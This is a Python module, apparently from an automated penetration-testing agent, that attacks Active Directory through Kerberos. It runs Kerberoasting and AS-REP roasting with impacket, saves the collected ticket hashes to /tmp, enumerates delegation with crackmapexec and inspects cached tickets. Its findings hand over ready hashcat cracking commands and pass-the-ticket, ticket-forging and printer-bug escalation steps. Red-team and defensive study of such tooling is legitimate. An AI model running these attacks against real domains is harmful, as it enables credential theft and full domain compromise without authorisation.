"""
kerberos_subagent.py — Kerberos attack suite (Kerberoasting, AS-REP, Pass-the-Ticket).

AGENT_NAME  : "lateral"
SUBAGENT_NAME: "kerberos"

Methodology:
  1. impacket-GetUserSPNs — Kerberoast service accounts
  2. impacket-GetNPUsers  — AS-REP roast accounts without pre-auth
  3. impacket-ticketer    — forge golden/silver tickets if NTLM hash available
  4. klist / klist -e     — enumerate existing cached tickets
  5. Check for delegation (constrained, unconstrained, resource-based)
  6. Parse hash files; store each attack surface as a finding
"""

from __future__ import annotations

import logging
import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_SPN_HASH_RE = re.compile(r"\$krb5tgs\$23\$", re.IGNORECASE)
_ASREP_HASH_RE = re.compile(r"\$krb5asrep\$23\$", re.IGNORECASE)
_TICKET_RE = re.compile(r"(Credentials cache|Service principal|Ticket|TGT|TGS)", re.IGNORECASE)
_DELEGATION_RE = re.compile(r"(msDS-AllowedToDelegateTo|TRUSTED_FOR_DELEGATION|unconstrained)", re.IGNORECASE)
_SERVICE_ACCOUNT_RE = re.compile(r"ServicePrincipalName\s*:\s*(\S+)", re.IGNORECASE)
_ERROR_RE = re.compile(r"(KDC_ERR|KRB5KDC_ERR|Clock skew|connection refused)", re.IGNORECASE)


class KerberosSubagent(BaseSubagent):
    """Execute Kerberos-based attacks: Kerberoasting, AS-REP roasting, ticket forgery."""

    AGENT_NAME: str = "lateral"
    SUBAGENT_NAME: str = "kerberos"

    async def run(
        self,
        target: str,
        domain: str = "",
        username: str = "",
        password: str = "",
        ntlm_hash: str = "",
        aes_key: str = "",
        **kwargs: Any,
    ) -> SubagentResult:
        """
        Run Kerberos attacks.

        Parameters
        ----------
        target:
            Domain controller IP or hostname.
        domain:
            Active Directory domain FQDN (e.g. corp.local).
        username:
            Valid domain account for authenticated attacks.
        password:
            Account password (mutually exclusive with ntlm_hash).
        ntlm_hash:
            NTLM hash for pass-the-hash / ticket forge (format: LM:NT).
        aes_key:
            AES256 key for pass-the-key attacks.

        Returns
        -------
        SubagentResult
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        cred_str = f"{domain}/{username}:{password}" if password else (
            f"{domain}/{username}" if username else ""
        )
        hash_flag = f"-hashes {ntlm_hash}" if ntlm_hash else ""
        aes_flag = f"-aesKey {aes_key}" if aes_key else ""

        # ── 1. Kerberoasting — GetUserSPNs ───────────────────────────────
        kerb_output = await self.collect_tool(
            "impacket-GetUserSPNs",
            target,
            {"options": (
                f"-dc-ip {target} -request "
                f"{hash_flag} {aes_flag} "
                f"{cred_str or '-no-pass'} "
                f"-outputfile /tmp/kerberoast_{target.replace('.', '_')}.hashes 2>&1"
            )},
        )

        spn_hashes = _SPN_HASH_RE.findall(kerb_output)
        spn_accounts = _SERVICE_ACCOUNT_RE.findall(kerb_output)

        if spn_hashes or spn_accounts:
            await self.store_finding(Finding(
                title=f"Kerberoasting: {len(spn_accounts or spn_hashes)} Service Account(s) Vulnerable",
                description=(
                    f"Kerberoastable service accounts were identified and TGS tickets collected. "
                    f"Service accounts: {', '.join(spn_accounts[:10]) or 'see evidence'}. "
                    f"RC4-encrypted tickets collected: {len(spn_hashes)}. "
                    f"Crack offline with hashcat -m 13100 to recover plaintext passwords."
                ),
                severity="HIGH",
                evidence=kerb_output[:2000],
                tool="impacket-GetUserSPNs",
                host=target,
                cve=None,
                mitre_technique="T1558.003",
                exploit_suggestion=(
                    f"hashcat -m 13100 /tmp/kerberoast_{target.replace('.', '_')}.hashes "
                    f"/usr/share/wordlists/rockyou.txt --force"
                ),
            ))
        else:
            await self.store_finding(Finding(
                title="Kerberoasting: No Service Accounts Found or Access Denied",
                description=(
                    "GetUserSPNs returned no kerberoastable accounts. "
                    "This may indicate no SPNs exist, insufficient privileges, "
                    "or clock skew preventing Kerberos authentication."
                ),
                severity="INFO",
                evidence=kerb_output[:500],
                tool="impacket-GetUserSPNs",
                host=target,
                mitre_technique="T1558.003",
            ))

        # ── 2. AS-REP Roasting — GetNPUsers ──────────────────────────────
        # Try without user list first (requires anon LDAP), then with discovered users
        asrep_output = await self.collect_tool(
            "impacket-GetNPUsers",
            target,
            {"options": (
                f"-dc-ip {target} -no-pass "
                f"-outputfile /tmp/asrep_{target.replace('.', '_')}.hashes "
                f"{cred_str or (domain + '/' if domain else '')} 2>&1"
            )},
        )

        asrep_hashes = _ASREP_HASH_RE.findall(asrep_output)
        if asrep_hashes:
            await self.store_finding(Finding(
                title=f"AS-REP Roasting: {len(asrep_hashes)} Account(s) Without Pre-auth",
                description=(
                    f"{len(asrep_hashes)} account(s) do not require Kerberos pre-authentication. "
                    "AS-REP tickets retrieved — crack offline to recover plaintext passwords. "
                    "No valid credentials were required to perform this attack."
                ),
                severity="HIGH",
                evidence=asrep_output[:2000],
                tool="impacket-GetNPUsers",
                host=target,
                mitre_technique="T1558.004",
                exploit_suggestion=(
                    f"hashcat -m 18200 /tmp/asrep_{target.replace('.', '_')}.hashes "
                    f"/usr/share/wordlists/rockyou.txt --force"
                ),
            ))

        # ── 3. Check existing ticket cache ───────────────────────────────
        klist_output = await self.collect_tool(
            "klist",
            target,
            {"options": "2>&1"},
        )

        cached_tickets = bool(_TICKET_RE.search(klist_output))
        if cached_tickets:
            await self.store_finding(Finding(
                title="Kerberos: Cached Tickets Found in Credential Store",
                description=(
                    "Active Kerberos tickets found in the local credential cache. "
                    "These can be extracted (pass-the-ticket) and reused to impersonate "
                    "the authenticated user without knowing the password."
                ),
                severity="HIGH",
                evidence=klist_output[:1000],
                tool="klist",
                host=target,
                mitre_technique="T1550.003",
                exploit_suggestion=(
                    "Run: impacket-ticketer to forge tickets if krbtgt hash is known. "
                    "Or: export KRB5CCNAME=/tmp/ticket.ccache and use impacket tools."
                ),
            ))

        # ── 4. Delegation enumeration ─────────────────────────────────────
        deleg_output = await self.collect_tool(
            "crackmapexec",
            target,
            {"options": (
                f"ldap {target} {'-u ' + repr(username) + ' -p ' + repr(password) if username else '-u guest -p guest'} "
                f"--trusted-for-delegation 2>&1"
            )},
        )

        has_delegation = bool(_DELEGATION_RE.search(deleg_output))
        if has_delegation:
            await self.store_finding(Finding(
                title="Kerberos: Unconstrained/Constrained Delegation Accounts Detected",
                description=(
                    "Accounts or computers with Kerberos delegation configured were found. "
                    "Unconstrained delegation allows impersonating any user connecting to that service. "
                    "Constrained delegation allows impersonating users to specific services. "
                    "Both can lead to domain-level privilege escalation."
                ),
                severity="HIGH",
                evidence=deleg_output[:1000],
                tool="crackmapexec",
                host=target,
                mitre_technique="T1134.001",
                exploit_suggestion=(
                    "For unconstrained delegation: wait for DA to authenticate or force it "
                    "with the printer bug (impacket-printerbug). "
                    "For constrained: use impacket-getST with -spn target_service."
                ),
            ))

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
